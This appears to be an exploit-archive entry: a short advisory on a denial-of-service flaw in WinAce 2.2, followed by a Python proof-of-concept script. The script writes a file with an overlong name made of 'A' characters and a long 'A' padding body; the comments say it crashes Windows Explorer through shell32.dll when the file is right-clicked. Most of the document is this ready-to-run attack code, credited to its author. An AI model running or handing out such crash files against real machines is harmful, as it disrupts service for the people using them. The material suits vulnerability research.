@@ -1,0 +1,66 @@
+source: http://www.securityfocus.com/bid/33049/info
+
+Winace is prone to a denial-of-service vulnerability.
+
+Attackers can exploit this issue to crash Windows Explorer, denying service to legitimate users. Given the nature of this issue, attackers may also be able to run arbitrary code, but this has not been confirmed.
+
+Winace 2.2 is vulnerable; other versions may also be affected. 
+
+#!/usr/bin/python
+#####################################
+# Author :
+cN4phux
+#
+# Mail   : cN4phux[at]Gmail[dot]com # Proud to be Algerian;    #
+# Site   : N/A (not
+yet)                                                                    #
+#####################################
+#Greetz to all DZ's : Blub , Knuthy , His0k4 , Djug , Izem , etc . . .
+#                   : Zigma , Heurs etc . . .
+
+# MS Windows Explorer Unspecified ( WinAce 2.2 ) Denial of Service Exploit
+# Magic offset :
+#           Bug comes from shell32.dll
+#    EventType : BEX     P1 : explorer.exe     P2 : 6.0.2900.2180     P3
+: 41107ece
+#    P4 : shell32.dll     P5 : 6.0.2900.2180     P6 : 4125330f     P7 :
+000e1666
+#    P8 : c0000409     P9 : 00000000
+#   Just right click the file and move your mouse to( Add to
+"AAAAAAAAAAAAAAAAAAAAAAAA. . . .ace"  ) with WinAce and you'll see ur
+Explorer crashes .
+#  Successfully tested on Windows XP SP2 FR,
+import sys
+txt_header =  ((("\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
+                 "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
+                 "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
+                 "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
+                 "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
+                 "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
+                 "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
+                 "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
+                 "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
+                 "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
+                 "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
+                 "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
+                 "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
+                 "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
+                 "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
+                 "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
+                 "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
+                 "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
+                 "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
+                 "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
+                 "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
+                 "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
+                 "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
+                 "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
+                 "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
+                 "\x41\x41\x41"))); #
+txt_title = "\x41"*194 #
+ext = ".txt";
+headers = open(txt_title + ext, "w")
+headers.write(txt_header)
+headers.close()
+print "\nFile created successfully !";
+print "\n\cN4phux.";
